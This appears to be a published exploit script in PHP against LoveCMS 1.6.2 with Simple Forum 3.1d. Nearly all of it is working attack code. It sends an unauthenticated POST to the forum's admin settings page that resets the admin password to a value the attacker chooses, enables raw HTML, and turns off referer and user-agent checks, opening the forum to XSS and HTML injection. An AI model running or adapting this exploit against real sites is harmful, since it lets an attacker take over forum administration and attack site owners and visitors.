LoveCMS 1.6.2 Final (Simple Forum 3.1d) Change Admin Password Exploit
=====================================================================


<?php

/**
* LoveCMS 1.6.2 Final (Simple Forum 3.1d) Change Admin Password Exploit
* Vulnerability found & exploited by cOndemned
*
* Download: 
*	http://www.thethinkingman.net/modules/download_manager/?id=4
*
* Description:
*	This exploit changes forum admin password (ex. attacker will be
*	able to delete threads/topics) and sets allowHTML to true 
*	(attacks such as XSS/HTML Injection will be possible)
*
*/

	$target	= &#039;localhost/audits/lovecms&#039;;
	$pass	= &#039;timetodie&#039;;
	$buff = array
		(
			&#039;language&#039;		=> &#039;en&#039;,
			&#039;forumWidth&#039;		=> &#039;500&#039;,
			&#039;forumAlign&#039;		=> &#039;left&#039;,
			&#039;forumTitle&#039;		=> &#039;Simple Forum&#039;,
			&#039;threadsPerPage&#039;	=> &#039;15&#039;,
			&#039;wordLength&#039;		=> &#039;50&#039;,
			&#039;autoDelete&#039;		=> &#039;12&#039;,
			&#039;adminPass&#039;		=> $pass,
			&#039;allowHTML&#039;		=> &#039;1&#039;,
			&#039;allowURLs&#039;		=> &#039;1&#039;,
			&#039;allowUBBs&#039;		=> &#039;1&#039;,
			&#039;enableIDs&#039;		=> &#039;0&#039;,
			&#039;enableSignature&#039;	=> &#039;1&#039;,
			&#039;enableRefererCheck&#039;	=> &#039;0&#039;,
			&#039;enableAgentCheck&#039;	=> &#039;0&#039;,
			&#039;agents&#039;		=> &#039;Mozilla.Opera.Lynx.Mosaic.amaya.WebExplorer.IBrowse.iCab&#039;,
			&#039;nonos&#039;			=> &#039;fuck.asshole&#039;,
			&#039;update&#039;		=> &#039;Update&#039;
		);

	$xpl = curl_init();

	curl_setopt($xpl, CURLOPT_URL, $target . &#039;/modules/simpleforum/admin/index.php&#039;);
	curl_setopt($xpl, CURLOPT_POST, 1);
	curl_setopt($xpl, CURLOPT_POSTFIELDS, $buff);

	curl_exec($xpl);
	curl_close($xpl);

	echo "[!] Go to the website and check if U can login.\r\n";	
?>



